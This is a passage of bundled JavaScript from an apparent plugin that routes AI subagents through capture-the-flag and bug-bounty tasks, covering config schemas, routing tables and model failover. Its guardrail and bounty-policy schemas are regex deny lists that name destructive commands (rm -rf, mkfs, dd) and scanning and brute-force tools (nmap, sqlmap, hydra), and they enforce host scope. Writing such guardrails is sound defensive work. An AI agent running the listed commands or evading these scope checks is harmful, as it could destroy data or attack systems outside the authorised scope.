      PWN: "ctf-pwn",
      REV: "ctf-rev",
      CRYPTO: "ctf-crypto",
      FORENSICS: "ctf-forensics",
      MISC: "ctf-explore",
      UNKNOWN: "ctf-explore"
    },
    plan: {
      WEB_API: "aegis-plan",
      WEB3: "aegis-plan",
      PWN: "aegis-plan",
      REV: "aegis-plan",
      CRYPTO: "aegis-plan",
      FORENSICS: "aegis-plan",
      MISC: "aegis-plan",
      UNKNOWN: "aegis-plan"
    },
    execute: {
      WEB_API: "aegis-exec",
      WEB3: "aegis-exec",
      PWN: "aegis-exec",
      REV: "aegis-exec",
      CRYPTO: "aegis-exec",
      FORENSICS: "aegis-exec",
      MISC: "aegis-exec",
      UNKNOWN: "aegis-exec"
    },
    stuck: {
      WEB_API: "ctf-research",
      WEB3: "ctf-research",
      PWN: "aegis-deep",
      REV: "aegis-deep",
      CRYPTO: "ctf-crypto",
      FORENSICS: "ctf-forensics",
      MISC: "ctf-hypothesis",
      UNKNOWN: "ctf-hypothesis"
    },
    failover: {
      WEB_API: "ctf-research",
      WEB3: "ctf-research",
      PWN: "ctf-pwn",
      REV: "ctf-rev",
      CRYPTO: "ctf-crypto",
      FORENSICS: "ctf-forensics",
      MISC: "ctf-hypothesis",
      UNKNOWN: "ctf-hypothesis"
    }
  },
  bounty: {
    scan: {
      WEB_API: "bounty-triage",
      WEB3: "bounty-triage",
      PWN: "bounty-triage",
      REV: "bounty-triage",
      CRYPTO: "bounty-triage",
      FORENSICS: "bounty-triage",
      MISC: "bounty-triage",
      UNKNOWN: "bounty-triage"
    },
    plan: {
      WEB_API: "aegis-plan",
      WEB3: "aegis-plan",
      PWN: "aegis-plan",
      REV: "aegis-plan",
      CRYPTO: "aegis-plan",
      FORENSICS: "aegis-plan",
      MISC: "aegis-plan",
      UNKNOWN: "aegis-plan"
    },
    execute: {
      WEB_API: "aegis-exec",
      WEB3: "aegis-exec",
      PWN: "aegis-exec",
      REV: "aegis-exec",
      CRYPTO: "aegis-exec",
      FORENSICS: "aegis-exec",
      MISC: "aegis-exec",
      UNKNOWN: "aegis-exec"
    },
    stuck: {
      WEB_API: "bounty-research",
      WEB3: "bounty-research",
      PWN: "bounty-triage",
      REV: "bounty-triage",
      CRYPTO: "bounty-research",
      FORENSICS: "bounty-triage",
      MISC: "bounty-research",
      UNKNOWN: "bounty-research"
    },
    failover: {
      WEB_API: "bounty-research",
      WEB3: "bounty-research",
      PWN: "bounty-scope",
      REV: "bounty-scope",
      CRYPTO: "bounty-research",
      FORENSICS: "bounty-scope",
      MISC: "bounty-research",
      UNKNOWN: "bounty-research"
    }
  }
};
var DEFAULT_CAPABILITY_PROFILES = {
  ctf: {
    WEB_API: { required_subagents: ["ctf-web", "ctf-research", "ctf-verify"] },
    WEB3: { required_subagents: ["ctf-web3", "ctf-research", "ctf-verify"] },
    PWN: { required_subagents: ["ctf-pwn", "ctf-solve"] },
    REV: { required_subagents: ["ctf-rev", "ctf-solve"] },
    CRYPTO: { required_subagents: ["ctf-crypto", "ctf-solve"] },
    FORENSICS: { required_subagents: ["ctf-forensics", "ctf-solve"] },
    MISC: { required_subagents: ["ctf-explore", "ctf-solve"] },
    UNKNOWN: { required_subagents: ["ctf-explore", "ctf-solve"] }
  },
  bounty: {
    WEB_API: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    WEB3: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    PWN: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    REV: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    CRYPTO: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    FORENSICS: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    MISC: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] },
    UNKNOWN: { required_subagents: ["bounty-scope", "bounty-triage", "bounty-research"] }
  }
};
var DEFAULT_SKILL_AUTOLOAD = {
  enabled: true,
  max_skills: 2,
  ctf: {
    scan: {
      WEB_API: ["top-web-vulnerabilities"],
      WEB3: ["ctf-solver"],
      PWN: ["ctf-solver"],
      REV: ["ctf-solver"],
      CRYPTO: ["ctf-solver"],
      FORENSICS: ["ctf-solver"],
      MISC: ["ctf-solver"],
      UNKNOWN: ["ctf-solver"]
    },
    plan: {
      WEB_API: ["plan-writing"],
      WEB3: ["plan-writing"],
      PWN: ["plan-writing"],
      REV: ["plan-writing"],
      CRYPTO: ["plan-writing"],
      FORENSICS: ["plan-writing"],
      MISC: ["plan-writing"],
      UNKNOWN: ["plan-writing"]
    },
    execute: {
      WEB_API: ["idor-testing", "systematic-debugging"],
      WEB3: ["systematic-debugging"],
      PWN: ["systematic-debugging"],
      REV: ["systematic-debugging"],
      CRYPTO: ["systematic-debugging"],
      FORENSICS: ["systematic-debugging"],
      MISC: ["systematic-debugging"],
      UNKNOWN: ["systematic-debugging"]
    }
  },
  bounty: {
    scan: {
      WEB_API: ["top-web-vulnerabilities"],
      WEB3: ["ethical-hacking-methodology"],
      PWN: ["ethical-hacking-methodology"],
      REV: ["ethical-hacking-methodology"],
      CRYPTO: ["ethical-hacking-methodology"],
      FORENSICS: ["ethical-hacking-methodology"],
      MISC: ["ethical-hacking-methodology"],
      UNKNOWN: ["ethical-hacking-methodology"]
    },
    plan: {
      WEB_API: ["plan-writing"],
      WEB3: ["plan-writing"],
      PWN: ["plan-writing"],
      REV: ["plan-writing"],
      CRYPTO: ["plan-writing"],
      FORENSICS: ["plan-writing"],
      MISC: ["plan-writing"],
      UNKNOWN: ["plan-writing"]
    },
    execute: {
      WEB_API: ["vulnerability-scanner"],
      WEB3: ["vulnerability-scanner"],
      PWN: ["vulnerability-scanner"],
      REV: ["vulnerability-scanner"],
      CRYPTO: ["vulnerability-scanner"],
      FORENSICS: ["vulnerability-scanner"],
      MISC: ["vulnerability-scanner"],
      UNKNOWN: ["vulnerability-scanner"]
    }
  },
  by_subagent: {
    "aegis-plan": ["ctf-workflow"],
    "aegis-exec": ["ctf-workflow"],
    "bounty-scope": ["bounty-workflow"],
    "ctf-rev": ["rev-analysis"],
    "ctf-pwn": ["pwn-exploit"]
  }
};
var GuardrailsSchema = exports_external.object({
  deny_destructive_bash: exports_external.boolean().default(true),
  destructive_command_patterns: exports_external.array(exports_external.string()).default([
    "\\brm\\s+-rf\\b",
    "\\bmkfs\\b",
    "\\bdd\\s+if=",
    "\\bshutdown\\b",
    "\\breboot\\b",
    "\\bpoweroff\\b",
    "\\bchown\\s+-R\\b",
    "\\bchmod\\s+777\\b",
    "\\bgit\\s+reset\\s+--hard\\b",
    "\\bgit\\s+clean\\s+-fdx\\b"
  ]),
  bounty_scope_readonly_patterns: exports_external.array(exports_external.string()).default([
    "^ls(\\s|$)",
    "^pwd(\\s|$)",
    "^whoami(\\s|$)",
    "^id(\\s|$)",
    "^uname(\\s|$)",
    "^cat(\\s|$)",
    "^head(\\s|$)",
    "^tail(\\s|$)",
    "^grep(\\s|$)",
    "^rg(\\s|$)",
    "^find(\\s|$)",
    "^readelf(\\s|$)",
    "^objdump(\\s|$)",
    "^strings(\\s|$)",
    "^xxd(\\s|$)",
    "^hexdump(\\s|$)",
    "^file(\\s|$)",
    "^sha256sum(\\s|$)"
  ])
});
var VerificationSchema = exports_external.object({
  verifier_tool_names: exports_external.array(exports_external.string()).default(["task", "bash", "pwno_run_command", "pwno_pwncli"]),
  verifier_title_markers: exports_external.array(exports_external.string()).default([
    "ctf-verify",
    "checker",
    "validator",
    "submission",
    "judge",
    "scoreboard"
  ])
});
var SkillListSchema = exports_external.array(exports_external.string()).default([]);
var TargetSkillMapSchema = exports_external.object({
  WEB_API: SkillListSchema,
  WEB3: SkillListSchema,
  PWN: SkillListSchema,
  REV: SkillListSchema,
  CRYPTO: SkillListSchema,
  FORENSICS: SkillListSchema,
  MISC: SkillListSchema,
  UNKNOWN: SkillListSchema
});
var SkillAutoloadModeSchema = exports_external.object({
  scan: TargetSkillMapSchema,
  plan: TargetSkillMapSchema,
  execute: TargetSkillMapSchema
});
var SkillAutoloadSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_skills: exports_external.number().int().positive().default(2),
  ctf: SkillAutoloadModeSchema.default(DEFAULT_SKILL_AUTOLOAD.ctf),
  bounty: SkillAutoloadModeSchema.default(DEFAULT_SKILL_AUTOLOAD.bounty),
  by_subagent: exports_external.record(exports_external.string(), exports_external.array(exports_external.string())).default({})
}).default(DEFAULT_SKILL_AUTOLOAD);
var MarkdownBudgetSchema = exports_external.object({
  worklog_lines: exports_external.number().int().positive().default(300),
  worklog_bytes: exports_external.number().int().positive().default(24 * 1024),
  evidence_lines: exports_external.number().int().positive().default(250),
  evidence_bytes: exports_external.number().int().positive().default(20 * 1024),
  scan_lines: exports_external.number().int().positive().default(200),
  scan_bytes: exports_external.number().int().positive().default(16 * 1024),
  context_pack_lines: exports_external.number().int().positive().default(80),
  context_pack_bytes: exports_external.number().int().positive().default(8 * 1024)
});
var FailoverSchema = exports_external.object({
  signatures: exports_external.array(exports_external.string()).default([
    "context_length_exceeded",
    "invalid_request_error",
    "timeout",
    "timed out",
    "etimedout"
  ]),
  map: exports_external.object({
    explore: exports_external.string().default("explore-fallback"),
    librarian: exports_external.string().default("librarian-fallback"),
    oracle: exports_external.string().default("oracle-fallback")
  }).default({
    explore: "explore-fallback",
    librarian: "librarian-fallback",
    oracle: "oracle-fallback"
  })
});
var DynamicModelSchema = exports_external.object({
  enabled: exports_external.boolean().default(false),
  health_cooldown_ms: exports_external.number().int().positive().default(300000),
  generate_variants: exports_external.boolean().default(true)
});
var BountyPolicySchema = exports_external.object({
  scope_doc_candidates: exports_external.array(exports_external.string()).default([
    ".Aegis/scope.md",
    ".opencode/bounty-scope.md",
    "BOUNTY_SCOPE.md",
    "SCOPE.md"
  ]),
  require_scope_doc: exports_external.boolean().default(false),
  enforce_allowed_hosts: exports_external.boolean().default(true),
  include_apex_for_wildcard_allow: exports_external.boolean().default(false),
  enforce_blackout_windows: exports_external.boolean().default(true),
  deny_scanner_commands: exports_external.boolean().default(true),
  scanner_command_patterns: exports_external.array(exports_external.string()).default([
    "\\bnmap\\b",
    "\\bmasscan\\b",
    "\\bnuclei\\b",
    "\\bffuf\\b",
    "\\bferoxbuster\\b",
    "\\bgobuster\\b",
    "\\bdirb\\b",
    "\\bwfuzz\\b",
    "\\bnikto\\b",
    "\\bsqlmap\\b",
    "\\bhydra\\b",
    "\\bpatator\\b",
    "\\bjohn\\b"
  ])
});
var AutoDispatchSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  preserve_user_category: exports_external.boolean().default(true),
  max_failover_retries: exports_external.number().int().positive().default(2),
  operational_feedback_enabled: exports_external.boolean().default(false),
  operational_feedback_consecutive_failures: exports_external.number().int().positive().default(2)
});
var ToolOutputTruncatorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  persist_mask_sensitive: exports_external.boolean().default(false),
  max_chars: exports_external.number().int().positive().default(30000),
  head_chars: exports_external.number().int().positive().default(12000),
  tail_chars: exports_external.number().int().positive().default(4000),
  per_tool_max_chars: exports_external.record(exports_external.string(), exports_external.number().int().positive()).default({})
}).default({
  enabled: true,
  persist_mask_sensitive: false,
  max_chars: 30000,
  head_chars: 12000,
  tail_chars: 4000,
  per_tool_max_chars: {
    bash: 20000,
    grep: 20000,
    task: 30000
  }
});
var ContextInjectionSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  inject_agents_md: exports_external.boolean().default(true),
  inject_readme_md: exports_external.boolean().default(true),
  max_files: exports_external.number().int().positive().default(6),
  max_chars_per_file: exports_external.number().int().positive().default(4000),
  max_total_chars: exports_external.number().int().positive().default(16000)
}).default({
  enabled: true,
  inject_agents_md: true,
  inject_readme_md: true,
  max_files: 6,
  max_chars_per_file: 4000,
  max_total_chars: 16000
});
var AutoLoopSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  only_when_ultrawork: exports_external.boolean().default(true),
  idle_delay_ms: exports_external.number().int().nonnegative().default(350),
  max_iterations: exports_external.number().int().positive().default(200),
  stop_on_verified: exports_external.boolean().default(true)
}).default({
  enabled: true,
  only_when_ultrawork: true,
  idle_delay_ms: 350,
  max_iterations: 200,
  stop_on_verified: true
});
var TargetDetectionSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  lock_after_first: exports_external.boolean().default(true),
  only_in_scan: exports_external.boolean().default(true)
}).default({
  enabled: true,
  lock_after_first: true,
  only_in_scan: true
});
var NotesSchema = exports_external.object({
  root_dir: exports_external.string().min(1).default(".Aegis")
}).default({
  root_dir: ".Aegis"
});
var CommentCheckerSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  only_in_bounty: exports_external.boolean().default(true),
  min_added_lines: exports_external.number().int().nonnegative().default(12),
  max_comment_ratio: exports_external.number().min(0).max(1).default(0.35),
  max_comment_lines: exports_external.number().int().nonnegative().default(25)
}).default({
  enabled: true,
  only_in_bounty: true,
  min_added_lines: 12,
  max_comment_ratio: 0.35,
  max_comment_lines: 25
});
var RulesInjectorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_files: exports_external.number().int().positive().default(6),
  max_chars_per_file: exports_external.number().int().positive().default(3000),
  max_total_chars: exports_external.number().int().positive().default(12000)
}).default({
  enabled: true,
  max_files: 6,
  max_chars_per_file: 3000,
  max_total_chars: 12000
});
var RecoverySchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  empty_message_sanitizer: exports_external.boolean().default(true),
  auto_compact_on_context_failure: exports_external.boolean().default(true),
  context_window_proactive_compaction: exports_external.boolean().default(true),
  context_window_proactive_threshold_ratio: exports_external.number().min(0.5).max(0.99).default(0.9),
  context_window_proactive_rearm_ratio: exports_external.number().min(0.3).max(0.95).default(0.75),
  edit_error_hint: exports_external.boolean().default(true),
  thinking_block_validator: exports_external.boolean().default(true),
  non_interactive_env: exports_external.boolean().default(true),
  session_recovery: exports_external.boolean().default(true),
  context_window_recovery: exports_external.boolean().default(true),
  context_window_recovery_cooldown_ms: exports_external.number().int().nonnegative().default(15000),
  context_window_recovery_max_attempts_per_session: exports_external.number().int().positive().default(6)
}).default({
  enabled: true,
  empty_message_sanitizer: true,
  auto_compact_on_context_failure: true,
  context_window_proactive_compaction: true,
  context_window_proactive_threshold_ratio: 0.9,
  context_window_proactive_rearm_ratio: 0.75,
  edit_error_hint: true,
  thinking_block_validator: true,
  non_interactive_env: true,
  session_recovery: true,
  context_window_recovery: true,
  context_window_recovery_cooldown_ms: 15000,
  context_window_recovery_max_attempts_per_session: 6
});
var InteractiveSchema = exports_external.object({
  enabled: exports_external.boolean().default(false),
  enabled_in_ctf: exports_external.boolean().default(true)
}).default({
  enabled: false,
  enabled_in_ctf: true
});
var ParallelBountyScanSchema = exports_external.object({
  max_tracks: exports_external.number().int().min(1).max(5).default(3),
  triage_tracks: exports_external.number().int().min(0).max(5).default(2),
  research_tracks: exports_external.number().int().min(0).max(5).default(1),
  scope_recheck_tracks: exports_external.number().int().min(0).max(5).default(0)
}).default({
  max_tracks: 3,
  triage_tracks: 2,
  research_tracks: 1,
  scope_recheck_tracks: 0
});
var ParallelSchema = exports_external.object({
  queue_enabled: exports_external.boolean().default(true),
  max_concurrent_per_provider: exports_external.number().int().positive().default(2),
  provider_caps: exports_external.record(exports_external.string(), exports_external.number().int().positive()).default({}),
  auto_dispatch_scan: exports_external.boolean().default(false),
  auto_dispatch_hypothesis: exports_external.boolean().default(false),
  bounty_scan: ParallelBountyScanSchema
}).default({
  queue_enabled: true,
  max_concurrent_per_provider: 2,
  provider_caps: {},
  auto_dispatch_scan: false,
  auto_dispatch_hypothesis: false,
  bounty_scan: {
    max_tracks: 3,
    triage_tracks: 2,
    research_tracks: 1,
    scope_recheck_tracks: 0
  }
});
var MemorySchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  storage_dir: exports_external.string().min(1).default(".Aegis/memory")
}).default({
  enabled: true,
  storage_dir: ".Aegis/memory"
});
var SequentialThinkingSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  activate_phases: exports_external.array(exports_external.enum(["SCAN", "PLAN", "EXECUTE"])).default(["PLAN"]),
  activate_targets: exports_external.array(exports_external.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])).default([
    "REV",
    "CRYPTO"
  ]),
  activate_on_stuck: exports_external.boolean().default(true),
  disable_with_thinking_model: exports_external.boolean().default(true),
  tool_name: exports_external.string().min(1).default("aegis_think")
}).default({
  enabled: true,
  activate_phases: ["PLAN"],
  activate_targets: ["REV", "CRYPTO"],
  activate_on_stuck: true,
  disable_with_thinking_model: true,
  tool_name: "aegis_think"
});
var TuiNotificationsSchema = exports_external.object({
  enabled: exports_external.boolean().default(false),
  throttle_ms: exports_external.number().int().nonnegative().default(5000)
}).default({
  enabled: false,
  throttle_ms: 5000
});
var TargetRouteMapSchema = exports_external.object({
  WEB_API: exports_external.string().min(1),
  WEB3: exports_external.string().min(1),
  PWN: exports_external.string().min(1),
  REV: exports_external.string().min(1),
  CRYPTO: exports_external.string().min(1),
  FORENSICS: exports_external.string().min(1),
  MISC: exports_external.string().min(1),
  UNKNOWN: exports_external.string().min(1)
});
var DomainRoutingSchema = exports_external.object({
  scan: TargetRouteMapSchema,
  plan: TargetRouteMapSchema,
  execute: TargetRouteMapSchema,
  stuck: TargetRouteMapSchema,
  failover: TargetRouteMapSchema
});
var RoutingSchema = exports_external.object({
  ctf: DomainRoutingSchema.default(DEFAULT_ROUTING.ctf),
  bounty: DomainRoutingSchema.default(DEFAULT_ROUTING.bounty)
});
var CapabilityProfileSchema = exports_external.object({
  required_subagents: exports_external.array(exports_external.string()).default([])
});
var TargetCapabilitySchema = exports_external.object({
  WEB_API: CapabilityProfileSchema,
  WEB3: CapabilityProfileSchema,
  PWN: CapabilityProfileSchema,
  REV: CapabilityProfileSchema,
  CRYPTO: CapabilityProfileSchema,
  FORENSICS: CapabilityProfileSchema,
  MISC: CapabilityProfileSchema,
  UNKNOWN: CapabilityProfileSchema
});
var CapabilityProfilesSchema = exports_external.object({
  ctf: TargetCapabilitySchema.default(DEFAULT_CAPABILITY_PROFILES.ctf),
  bounty: TargetCapabilitySchema.default(DEFAULT_CAPABILITY_PROFILES.bounty)
});
var AutoTriageSchema = exports_external.object({
  enabled: exports_external.boolean().default(true)
}).default({ enabled: true });
var FlagDetectorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  custom_patterns: exports_external.array(exports_external.string()).default([])
}).default({ enabled: true, custom_patterns: [] });
var PatternMatcherSchema = exports_external.object({
  enabled: exports_external.boolean().default(true)
}).default({ enabled: true });
var ReconPipelineSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_commands_per_phase: exports_external.number().int().positive().default(10)
}).default({ enabled: true, max_commands_per_phase: 10 });
var DeltaScanSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  max_age_ms: exports_external.number().int().positive().default(24 * 60 * 60 * 1000)
}).default({ enabled: true, max_age_ms: 86400000 });
var ReportGeneratorSchema = exports_external.object({
  enabled: exports_external.boolean().default(true)
}).default({ enabled: true });
var OrchestratorConfigSchema = exports_external.object({
  enabled: exports_external.boolean().default(true),
  enable_builtin_mcps: exports_external.boolean().default(true),
  google_auth: exports_external.boolean().optional(),
  disabled_mcps: exports_external.array(AnyMcpNameSchema).default([]),
  strict_readiness: exports_external.boolean().default(true),
  enable_injection_logging: exports_external.boolean().default(true),
  enforce_todo_single_in_progress: exports_external.boolean().default(true),
  enforce_todo_flow_non_scan: exports_external.boolean().default(true),
  enforce_todo_granularity_non_scan: exports_external.boolean().default(true),
  todo_min_items_non_scan: exports_external.number().int().min(1).default(2),
  parallel: ParallelSchema,
  tool_output_truncator: ToolOutputTruncatorSchema,
  context_injection: ContextInjectionSchema,
  auto_loop: AutoLoopSchema,
  target_detection: TargetDetectionSchema,
  notes: NotesSchema,
  comment_checker: CommentCheckerSchema,
  rules_injector: RulesInjectorSchema,
  recovery: RecoverySchema,
  interactive: InteractiveSchema,
  tui_notifications: TuiNotificationsSchema,
  memory: MemorySchema,
  sequential_thinking: SequentialThinkingSchema,
  ctf_fast_verify: exports_external.object({
    enabled: exports_external.boolean().default(true),
    enforce_all_targets: exports_external.boolean().default(false),
    risky_targets: exports_external.array(exports_external.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])).default([
      "PWN",
      "REV",
      "CRYPTO"
    ]),
    require_nonempty_candidate: exports_external.boolean().default(true)
  }).default({
    enabled: true,
    enforce_all_targets: false,
    risky_targets: ["PWN", "REV", "CRYPTO"],
    require_nonempty_candidate: true
  }),
  default_mode: exports_external.enum(["CTF", "BOUNTY"]).default("BOUNTY"),
  enforce_mode_header: exports_external.boolean().default(false),
  allow_free_text_signals: exports_external.boolean().default(false),
  stuck_threshold: exports_external.number().int().positive().default(2),
  guardrails: GuardrailsSchema.default(GuardrailsSchema.parse({})),
  bounty_policy: BountyPolicySchema.default(BountyPolicySchema.parse({})),
  verification: VerificationSchema.default(VerificationSchema.parse({})),
  markdown_budget: MarkdownBudgetSchema.default(MarkdownBudgetSchema.parse({})),
  failover: FailoverSchema.default(FailoverSchema.parse({})),
  dynamic_model: DynamicModelSchema.default(DynamicModelSchema.parse({})),
  auto_dispatch: AutoDispatchSchema.default(AutoDispatchSchema.parse({})),
  routing: RoutingSchema.default(DEFAULT_ROUTING),
  capability_profiles: CapabilityProfilesSchema.default(DEFAULT_CAPABILITY_PROFILES),
  skill_autoload: SkillAutoloadSchema,
  auto_triage: AutoTriageSchema,
  flag_detector: FlagDetectorSchema,
  pattern_matcher: PatternMatcherSchema,
  recon_pipeline: ReconPipelineSchema,
  delta_scan: DeltaScanSchema,
  report_generator: ReportGeneratorSchema
});

// src/config/loader.ts
function isRecord(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function deepMerge(a, b) {
  const left = isRecord(a) ? a : {};
  const right = isRecord(b) ? b : {};
  const out = { ...left };
  for (const [key, value] of Object.entries(right)) {
    const existing = out[key];
    if (isRecord(existing) && isRecord(value)) {
      out[key] = deepMerge(existing, value);
      continue;
    }
    out[key] = value;
  }
  return out;
}
function stripJsonComments(raw) {
  let out = "";
  let inString = false;
  let isEscaped = false;
  let inLineComment = false;
  let inBlockComment = false;
  for (let i = 0;i < raw.length; i += 1) {
    const ch = raw[i];
    const next = i + 1 < raw.length ? raw[i + 1] : "";
    if (inLineComment) {
      if (ch === `
`) {
        inLineComment = false;
        out += ch;
      }
      continue;
    }
    if (inBlockComment) {
      if (ch === "*" && next === "/") {
        inBlockComment = false;
        i += 1;
      }
      continue;
    }
    if (inString) {
      out += ch;
      if (isEscaped) {
        isEscaped = false;
        continue;
      }
      if (ch === "\\") {
        isEscaped = true;
        continue;
      }
      if (ch === '"') {
        inString = false;
      }
      continue;
    }
    if (ch === '"') {
      inString = true;
      out += ch;
      continue;
    }
    if (ch === "/" && next === "/") {
      inLineComment = true;
      i += 1;
      continue;
    }
    if (ch === "/" && next === "*") {
      inBlockComment = true;
      i += 1;
      continue;
    }
    out += ch;
  }
  return out;
}
function readJSON(path, onWarning) {
  if (!existsSync(path)) {
    return {};
  }
  try {
    const raw = readFileSync(path, "utf-8");
    const stripped = stripJsonComments(raw);
    return JSON.parse(stripped);
  } catch (error48) {
    const message = error48 instanceof Error ? error48.message : String(error48);
    if (onWarning) {
      onWarning(`Failed to parse config JSON: ${path} (${message})`);
    }
    return {};
  }
}
function resolveConfigPath(candidate) {
  if (existsSync(candidate)) {
    return candidate;
  }
  if (candidate.toLowerCase().endsWith(".json")) {
    const jsonc = `${candidate.slice(0, -5)}.jsonc`;
    if (existsSync(jsonc)) {
      return jsonc;
    }
  }
  return candidate;
}
function loadConfig(projectDir, options) {
  const projectPath = resolveConfigPath(join(projectDir, ".Aegis", "oh-my-Aegis.json"));
  const userCandidates = [];
  const xdg = process.env.XDG_CONFIG_HOME;
  const home = process.env.HOME;
  const appData = process.env.APPDATA;
  const warn = options?.onWarning;
  if (xdg) {
    userCandidates.push(resolveConfigPath(join(xdg, "opencode", "oh-my-Aegis.json")));
  }
  if (home) {
    userCandidates.push(resolveConfigPath(join(home, ".config", "opencode", "oh-my-Aegis.json")));
  }
  if (process.platform === "win32" && appData) {
    userCandidates.push(resolveConfigPath(join(appData, "opencode", "oh-my-Aegis.json")));
  }
  let userConfig = {};
  for (const candidate of userCandidates) {
    if (existsSync(candidate)) {
      userConfig = readJSON(candidate, warn);
      break;
    }
  }
  const projectConfig = readJSON(projectPath, warn);
  const merged = deepMerge(userConfig, projectConfig);
  const parsed = OrchestratorConfigSchema.safeParse(merged);
  if (parsed.success) {
    return parsed.data;
  }
  if (warn) {
    warn(`Config schema validation failed; falling back to defaults (issues=${parsed.error.issues.length}).`);
  }
  return OrchestratorConfigSchema.parse({});
}

// src/config/readiness.ts
import { existsSync as existsSync3, readFileSync as readFileSync3 } from "fs";
import { join as join4 } from "path";

// src/install/agent-overrides.ts
var AGENT_OVERRIDES = {
  "aegis-plan": { model: "opencode/glm-5-free" },
  "aegis-exec": { model: "openai/gpt-5.3-codex", variant: "high" },
  "aegis-deep": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-web": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-web3": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-pwn": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-rev": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-crypto": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-forensics": { model: "opencode/glm-5-free" },
  "ctf-explore": { model: "opencode/glm-5-free" },
  "ctf-solve": { model: "openai/gpt-5.3-codex", variant: "high" },
  "ctf-research": { model: "opencode/glm-5-free" },
  "ctf-hypothesis": { model: "opencode/glm-5-free" },
  "ctf-decoy-check": { model: "opencode/glm-5-free" },
  "ctf-verify": { model: "openai/gpt-5.3-codex", variant: "medium" },
  "bounty-scope": { model: "openai/gpt-5.3-codex", variant: "medium" },
  "bounty-triage": { model: "openai/gpt-5.3-codex", variant: "high" },
  "bounty-research": { model: "opencode/glm-5-free" },
  "deep-plan": { model: "opencode/glm-5-free" },
  "md-scribe": { model: "opencode/glm-5-free" },
  "explore-fallback": { model: "opencode/glm-5-free" },
  "librarian-fallback": { model: "opencode/glm-5-free" },
  "oracle-fallback": { model: "opencode/glm-5-free" }
};

// src/orchestration/model-health.ts
var VARIANT_SEP = "--";
var MODEL_SHORT = {
  "openai/gpt-5.3-codex": "codex",
  "opencode/glm-5-free": "glm",
  "anthropic/claude-sonnet-4.5": "claude",
  "anthropic/claude-opus-4.1": "opus"
};
var SHORT_TO_MODEL = {};
for (const [full, short] of Object.entries(MODEL_SHORT)) {
  SHORT_TO_MODEL[short] = full;
}
var DEFAULT_AGENT_MODEL = "openai/gpt-5.3-codex";
var DEFAULT_AGENT_VARIANT = "medium";
var MODEL_VARIANTS = {
  "openai/gpt-5.3-codex": ["low", "medium", "high", "xhigh"],
  "anthropic/claude-sonnet-4.5": ["low", "max"],
  "anthropic/claude-opus-4.1": ["low", "max"]
};
var MODELS_WITHOUT_VARIANT = new Set([
  "opencode/glm-5-free"
]);
var MODEL_DEFAULT_VARIANT = {
  "openai/gpt-5.3-codex": "medium",
  "anthropic/claude-sonnet-4.5": "low",
  "anthropic/claude-opus-4.1": "low"
};
var NO_VARIANT_AGENTS = new Set([
  "explore-fallback",
  "librarian-fallback",
  "oracle-fallback"
]);
var DEFAULT_COOLDOWN_MS = 300000;
var MODEL_ALTERNATIVES = {
  "openai/gpt-5.3-codex": [
    "opencode/glm-5-free",
    "anthropic/claude-sonnet-4.5"
  ],
  "opencode/glm-5-free": [
    "openai/gpt-5.3-codex",
    "anthropic/claude-sonnet-4.5"
  ],
  "anthropic/claude-sonnet-4.5": [
    "openai/gpt-5.3-codex",
    "opencode/glm-5-free"
  ],
  "anthropic/claude-opus-4.1": [
    "openai/gpt-5.3-codex",
    "opencode/glm-5-free"
  ]
};
function agentModel(agentName) {
  const idx = agentName.indexOf(VARIANT_SEP);
  if (idx !== -1) {
    const short = agentName.slice(idx + VARIANT_SEP.length);
    const model = SHORT_TO_MODEL[short];
    if (model) {
      return model;
    }
  }
  const base = baseAgentName(agentName);
  const override = AGENT_OVERRIDES[base];
  if (override) {
    return override.model;
  }
  return;
}
function modelAlternatives(model) {
  return MODEL_ALTERNATIVES[model] ?? [];
}
function baseAgentName(agentName) {
  const idx = agentName.indexOf(VARIANT_SEP);
  if (idx === -1) {
    return agentName;
  }
  return agentName.slice(0, idx);
}
function isModelHealthy(state, model, cooldownMs = DEFAULT_COOLDOWN_MS) {
  const entry = state.modelHealthByModel[model];
  if (!entry) {
    return true;
  }
  return Date.now() - entry.unhealthySince >= cooldownMs;
}
function resolveHealthyModel(baseAgent, state, cooldownMs = DEFAULT_COOLDOWN_MS) {
  if (NO_VARIANT_AGENTS.has(baseAgent)) {
    return agentModel(baseAgent);
  }
  const primaryModel = agentModel(baseAgent);
  if (!primaryModel) {
    return;
  }
  if (isModelHealthy(state, primaryModel, cooldownMs)) {
    return primaryModel;
  }
  const alts = modelAlternatives(primaryModel);
  for (const alt of alts) {
    if (isModelHealthy(state, alt, cooldownMs)) {
      return alt;
    }
  }
  return primaryModel;
}
function providerIdFromModel(model) {
  const trimmed = model.trim();
  const idx = trimmed.indexOf("/");
  if (idx === -1)
    return trimmed;
  return trimmed.slice(0, idx);
}
function mapVariantAlias(model, variant) {
  const provider = providerIdFromModel(model);
  const normalized = variant.trim().toLowerCase();
  if (!normalized)
    return null;
  if (provider === "openai") {
